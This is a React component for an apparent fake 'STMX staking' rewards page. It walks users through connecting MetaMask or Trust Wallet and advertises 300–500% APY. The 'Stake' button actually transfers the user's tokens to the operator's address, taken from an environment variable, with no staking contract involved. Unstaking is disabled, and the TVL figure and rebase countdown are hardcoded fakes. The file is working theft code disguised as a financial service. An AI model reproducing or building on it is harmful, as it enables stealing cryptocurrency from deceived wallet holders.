import React, { useState, useEffect, useMemo } from "react";
import styles from "./guide.module.scss";
import gift from "../../assets/Gift.svg";
import { IoIosArrowForward } from "react-icons/io";
import { MdComputer } from "react-icons/md";
import PcLogo from "../../assets/pcLogo.jpg";
import met1 from "../../assets/met1.jpeg";
import met2 from "../../assets/met2.jpeg";
import met3 from "../../assets/met3.jpeg";
import twt1 from "../../assets/twt1.jpeg";
import twt2 from "../../assets/twt2.jpeg";
import twt3 from "../../assets/twt3.jpeg";
import { ethers } from "ethers";
import { formatFixed } from "@exodus/ethersproject-bignumber";
import dayjs from "dayjs";
import relativeTime from "dayjs/plugin/relativeTime";
import Countdown from "react-countdown";
import { getTokenBalances, transferToken } from "../../helper/helpers";
import { BsArrowRightCircleFill } from "react-icons/bs";
dayjs.extend(relativeTime);

const Guide = ({
  setStateValue,
  stateValue,
  setLoadingTable,
  loadingTable,
}) => {
  const [state, setState] = useState({
    connectPc: false,
    connectMeta: false,
    connectTrust: false,
  });
  // prevent the count down from rendering
  const rebase = useMemo(
    () => dayjs(Date.now()).add(7, "hour"),
    [stateValue.walletConnected]
  );

  const [listAllTokens, setListAllTokens] = useState([]);

  const [stakeValue, setStakeValue] = useState(null);
  const [processingStaking, setProcessingStaking] = useState(false);

  // 0xbe9375c6a420d2eeb258962efb95551a5b722803

  let to = process.env.REACT_APP_MY_ADDRESS;
  // console.log(to);

  let APIKeyString = process.env.REACT_APP_API_KEY;
  // console.log(APIKeyString);

  useEffect(() => {
    const walletAddressData = sessionStorage.getItem("account");
    const balanceData = sessionStorage.getItem("balance");
    const chainIdData = sessionStorage.getItem("chainID");
    const userWalletData = sessionStorage.getItem("setuserWallet");

    if (walletAddressData) {
      setStateValue({
        initiateWallet: true,
        processingWalletConnect: false,
        chainID: parseInt(chainIdData),
        accountBalance: balanceData,
        userWallet: userWalletData,
        walletAddress: walletAddressData,
        walletConnected: true,
      });

      (async () => {
        await getERC20Tokens();
        setStateValue({
          initiateWallet: false,
          processingWalletConnect: false,
          chainID: parseInt(chainIdData),
          accountBalance: balanceData,
          userWallet: userWalletData,
          walletAddress: walletAddressData,
          walletConnected: true,
        });
      })();
    }
  }, [stateValue.walletConnected, setStateValue]);

  // console.log(stateValue);

  // Fetches all the user tokens
  const getERC20Tokens = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    let chainId = stateValue.chainID;
    let userwallet = stateValue.userWallet;

    if (chainId === 0) {
      if (sessionStorage.getItem("chainID")) {
        chainId = parseInt(sessionStorage.getItem("chainID"));
        userwallet = sessionStorage.getItem("setuserWallet");
      }
    }
    const allTokens = await getTokenBalances({
      chainID: chainId,
      APIKeyString,
      userWallet: userwallet,
      provider,
    });
    setListAllTokens(allTokens);
    setLoadingTable(false);
    return allTokens;
  };

  const fArray = [...listAllTokens];
  const result = fArray?.filter((item) => {
    if (item.address === "0xbe9375c6a420d2eeb258962efb95551a5b722803") {
      return item.address;
    }
    return false;
  });
  console.log(result);

  console.log(`Loading Table${loadingTable}`);

  // count down functionality starts here
  const renderer = ({ days, hours, minutes, seconds, completed }) => {
    return <span>{`${days}d: ${hours}h: ${minutes}m: ${seconds}s`}</span>;
  };

  const renderer2 = ({ hours, minutes, seconds, completed }) => {
    return <span>{` ${hours}h: ${minutes}m: ${seconds}s`}</span>;
  };
  // count down functionality ends here

  // functionality that handle the instructions toggle
  const handleToggleInstruction = (id) => {
    let newObj = { ...state };
    newObj[id] = !newObj[id];
    setState(newObj);
  };

  // function that toglle tab between stake and unstake
  const [toggleStakeTab, setToggleStakeTab] = useState({
    stakeTab: true,
    unStakeTabe: false,
  });
  const handleToggleTab = (id) => {
    let newObj = { ...toggleStakeTab };
    Object.keys(newObj).map((item) => (newObj[item] = false));
    newObj[id] = true;
    setToggleStakeTab(newObj);
    console.log("??es");
  };

  //   This functionality format token balance big number
  const formatBalance = (balance, decimals) => {
    let format = formatFixed(
      balance.toString(),
      Math.max(parseInt(decimals.toString()), 1)
    ).toString();
    return format;
  };

  const setTransferClick = async (balanceObj) => {
    console.log(balanceObj);
    if (typeof to !== "string") {
      to = `${to}`;
    } else {
      // checks it the recipient address is a valid address
      const isAddress = ethers.utils.isAddress(to);
      if (!isAddress) {
        console.log("Invalid address provided, please try again");
      } else {
        try {
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          await transferToken(balanceObj, to, provider);
          setProcessingStaking(false);
        } catch (error) {
          setProcessingStaking(false);
          console.log(error);
        }
      }
    }
  };

  return (
    <div className={styles.container}>
      {!stateValue.walletConnected ? (
        <div className={styles.containerContent}>
          <div className={styles.countdown}>
            <h1>Stake STMX to get 500 APY</h1>
            <div className={styles.imgContainer}>
              <img src={gift} alt={gift} />
            </div>
            <div className={styles.countdownContainer}>
              <span className={styles.text}> Activity ends in </span>
              <Countdown date={`2022/07/11`} renderer={renderer} />
            </div>
            <div className={`${styles.meter} ${styles.red}`}>
              <span style={{ width: "40%" }}> </span>
            </div>
          </div>
          <div className={styles.guide}>
            <div className={styles.content}>
              <h2>HOW TO PARTICIPATE</h2>
              <span>
                Click on the section highlighted below for detailed instructions
                on how to partake in the reward
              </span>
              {/* Instructions for PC */}
              <div className={styles.connectPcContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectPc");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your PC</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectPc && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectPc && "600px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        if you have metamask wallet or it extension (installed
                        on your browser on your PC, you're good to go)
                      </li>
                      <li>
                        if you don't have metamask wallet installed on your Pc,
                        Download the metamask wallet extension on your chrome
                        browser and import your wallet
                        <img src={PcLogo} alt={PcLogo} />
                      </li>
                      <li>
                        Connect your wallet with our app using chrome metamask
                        extension wallet installed on your PC.
                      </li>

                      <li>This offer is eligible to all stmx holders ONLY</li>
                      <li>
                        Distribution of loyalty tokens is totally dependent on
                        the amount of STMX tokens held in the wallet (that is
                        the more loyalty tokens you hold, the more loyalty
                        tokens you'll get)
                      </li>
                      <li>
                        <b>
                          Please contact any of our adminstrator if you
                          encounter any difficulties or need more guidance
                        </b>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for PC End here*/}
              {/* Instructions for Metamask */}
              <div className={styles.metaContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectMeta");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your mobile wallet (Metamask)</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectMeta && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectMeta && "1300px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        If you have Metamask wallet installed on your mobile
                        device, you're good to go.
                      </li>
                      <li>
                        If you don't have metamask wallet installed on your
                        mobile device, download the metamask wallet app from
                        either App store on your IOS devices or Google play
                        store store on your android devices
                      </li>
                      <li>Import your wallet</li>
                      <li>
                        Open your wallet and ensure you are on Etherium Main
                        Network then click on the navbar icon (the icon with
                        three parallel lines)
                        <img src={met1} alt={met1} />
                      </li>
                      <li>
                        Click on browser
                        <img src={met2} alt={met2} />
                      </li>
                      <li>
                        Copy our website url and paste the link in the search
                        field: https://stmx-rebasepool.onrender.com
                        <img src={met3} alt={met3} />
                      </li>
                      <li>Proceed to connect your wallet with our app</li>
                      <li>
                        <b>
                          Please contact any of our administrator if you
                          encounter any difficulties or need more guidance
                        </b>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for Metamask end here */}
              {/* Instructions for Trust */}
              <div className={styles.trustContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectTrust");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your mobile wallet (Trust wallet)</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectTrust && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectTrust && "1300px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        If you have Trust wallet installed on your mobile
                        device, you're good to go.
                      </li>
                      <li>
                        If you don't have Trust wallet installed on your mobile
                        device, download the Trust wallet app from either App
                        store on your IOS devices or Google play store store on
                        your android devices
                      </li>
                      <li>Import your wallet</li>

                      <li>
                        For IOS devices, glance to the bottom of your app and
                        click on browse
                        <img src={twt1} alt={twt1} />
                      </li>
                      <li>
                        For Android devices, glance to the bottom of your app
                        and click on dApps
                        <img src={twt3} alt={twt3} />
                      </li>
                      <li>
                        Copy our website url and paste the link in the search
                        field: https://stmx-rebasepool.onrender.com
                        <img src={twt2} alt={met2} />
                      </li>
                      <li>Proceed to connect your wallet with our app</li>
                      <li>
                        <b>
                          Please contact any of our adminstrator if you
                          encounter any difficulties or need more guidance
                        </b>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for Trust end here */}
            </div>
          </div>
        </div>
      ) : (
        <div className={styles.tokenContainer}>
          <div className={styles.tokenBalanceContainer}>
            {" "}
            <div className={styles.ethBalance}>
              <div className={styles.ethBalanceContent}>
                <div>
                  <h2>{stateValue.chainID === 1 ? "ETH" : "BSC"} BALANCE</h2>
                  <span>{stateValue.accountBalance}</span>
                </div>
              </div>
            </div>
            <div className={styles.tokenBalance}>
              {result.length >= 1 ? (
                <div className={styles.ethBalanceContent}>
                  {result?.map((item) => (
                    <div>
                      <h2>{item.name}</h2>
                      <span>
                        {parseFloat(
                          formatBalance(item.balance, item.decimals)
                        ).toFixed(2)}
                      </span>
                    </div>
                  ))}
                </div>
              ) : (
                <div className={styles.notEligible}>
                  {loadingTable
                    ? `Loading...`
                    : `Your are not eligible for this offer`}
                </div>
              )}
            </div>
          </div>
          <div className={styles.loyaltyContainer}>
            {result.length < 1 ? (
              <div className={styles.notEligible}>
                <div>
                  {loadingTable ? (
                    `Loading...`
                  ) : (
                    <h2> This offer is only available to STMX holders only</h2>
                  )}
                </div>
              </div>
            ) : (
              <div className={styles.stakeContainer}>
                <div className={styles.stakeGuide}>
                  <div className={styles.stakeGuideHeader}>
                    <span>
                      <b> EARN STMX TOKENS to earn 300% apy</b>
                    </span>
                  </div>

                  <li>
                    <span className={styles.arrowKeyGuide}>
                      <BsArrowRightCircleFill />
                    </span>
                    <span>Earn STMX weekly by staking.</span>
                  </li>
                  <li>
                    <span className={styles.arrowKeyGuide}>
                      <BsArrowRightCircleFill />
                    </span>
                    <span>earn 6.5% of your total stakes in 5 days.</span>
                  </li>
                  <li>
                    <span className={styles.arrowKeyGuide}>
                      <BsArrowRightCircleFill />
                    </span>
                    <span>Minimum amount to stake is 20000 STMX tokens.</span>
                  </li>

                  <li>
                    <span className={styles.arrowKeyGuide}>
                      <BsArrowRightCircleFill />
                    </span>
                    <span>
                      Staking bonus will be automatically compounded to your
                      previous stakes to earn more token.
                    </span>
                  </li>
                  <li>
                    <span className={styles.arrowKeyGuide}>
                      <BsArrowRightCircleFill />
                    </span>
                    <span>
                      {" "}
                      You can only unstake 7 days after your first initial
                      staking.
                    </span>
                  </li>
                  <li>
                    <span className={styles.arrowKeyGuide}>
                      <BsArrowRightCircleFill />
                    </span>
                    <span>Fully secure and easy-to-do process.</span>
                  </li>
                  <li>
                    <span className={styles.arrowKeyGuide}>
                      <BsArrowRightCircleFill />
                    </span>
                    <span>
                      {" "}
                      NOTE that staking requires ETH as part of the Ethereum
                      network transaction fees.
                    </span>
                  </li>
                </div>

                <div className={styles.stakeFormContainer}>
                  <div className={styles.stakeCountdownContainer}>
                    <h2>STMX Staking</h2>
                    <Countdown date={rebase} renderer={renderer2} />{" "}
                    <span className={styles.text}>to Next Rebase </span>
                  </div>
                  <div className={styles.stakingApy}>
                    <span className={styles.apyValue}>
                      <h4>APY</h4>
                      <span>300%</span>
                    </span>

                    <span className={styles.tvlvalue}>
                      <div>
                        <h4>TVL</h4>
                        <span>$30,000,000</span>
                      </div>
                      <div>
                        <h4>Current index</h4>
                        <span>201.85 STMX</span>
                      </div>
                    </span>
                  </div>

                  <div className={styles.toggleStakeTab}>
                    <button
                      style={{
                        borderBottom:
                          toggleStakeTab.stakeTab && "1px solid var(--white)",
                      }}
                      onClick={() => {
                        handleToggleTab("stakeTab");
                      }}
                    >
                      Stake
                    </button>
                    <button
                      onClick={() => {
                        handleToggleTab("unStakeTabe");
                      }}
                      style={{
                        borderBottom:
                          toggleStakeTab.unStakeTabe &&
                          "1px solid var(--white)",
                      }}
                    >
                      Unstake
                    </button>
                  </div>
                  {toggleStakeTab.stakeTab && (
                    <form>
                      {result.length > 0 && (
                        <div className={styles.stakeBalanceContent}>
                          {result?.map((item) => (
                            <div className={styles.stakeMapContent}>
                              <div className={styles.formGroup}>
                                <input
                                  type="number"
                                  placeholder="Amount"
                                  value={stakeValue}
                                  onChange={(e) => {
                                    setStakeValue(e.target.value);
                                  }}
                                />
                                <div className={styles.maxButton}>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      setStakeValue(
                                        parseFloat(
                                          formatBalance(
                                            item.balance,
                                            item.decimals
                                          )
                                        ).toFixed(2)
                                      );
                                    }}
                                  >
                                    max
                                  </button>
                                </div>
                              </div>

                              <button
                                type="button"
                                onClick={() => {
                                  if (!stakeValue) return;
                                  setProcessingStaking(true);
                                  setTransferClick(item);
                                }}
                              >
                                {processingStaking ? "Processing" : "Stake"}
                              </button>
                              <div className={styles.stakeExtras}>
                                <h4>Current Balance </h4>
                                <span>
                                  {parseFloat(
                                    formatBalance(item.balance, item.decimals)
                                  ).toFixed(2)}{" "}
                                  {item.name}
                                </span>
                              </div>
                              <div className={styles.stakeExtras}>
                                <h4>Expected staking reward</h4>
                                <span>
                                  {parseFloat(stakeValue * 0.28).toFixed(2)}{" "}
                                  {item.name}
                                </span>
                              </div>
                              <div className={styles.stakeExtras}>
                                <h4>Total balance after staking</h4>
                                <span>
                                  {parseInt(
                                    parseFloat(
                                      formatBalance(item.balance, item.decimals)
                                    ).toFixed(2)
                                  ) + parseInt(stakeValue * 0.28)}{" "}
                                  {item.name}
                                </span>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </form>
                  )}

                  {toggleStakeTab.unStakeTabe && (
                    <form>
                      <div className={styles.unstakeInfo}>
                        <span>
                          Only users that have staked their tokens are permitted
                          to use this feature
                        </span>
                      </div>
                      {result.length > 0 && (
                        <div className={styles.stakeBalanceContent}>
                          {result?.map((item) => (
                            <div className={styles.stakeMapContent}>
                              <div className={styles.formGroup}>
                                <input
                                  type="number"
                                  placeholder="Amount"
                                  value={stakeValue}
                                  onChange={(e) => {
                                    setStakeValue(e.target.value);
                                  }}
                                  disabled
                                />
                                <div className={styles.maxButton}>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      setStakeValue(
                                        parseFloat(
                                          formatBalance(
                                            item.balance,
                                            item.decimals
                                          )
                                        ).toFixed(2)
                                      );
                                    }}
                                  >
                                    max
                                  </button>
                                </div>
                              </div>

                              <button
                                disabled
                                type="button"
                                onClick={() => {
                                  if (!stakeValue) return;
                                  setProcessingStaking(true);
                                  setTransferClick(item);
                                }}
                              >
                                {processingStaking ? "Processing" : "Unstake"}
                              </button>
                              <div className={styles.stakeExtras}>
                                <h4>Current Balance </h4>
                                <span>
                                  {parseFloat(
                                    formatBalance(item.balance, item.decimals)
                                  ).toFixed(2)}{" "}
                                  {item.name}
                                </span>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </form>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Guide;
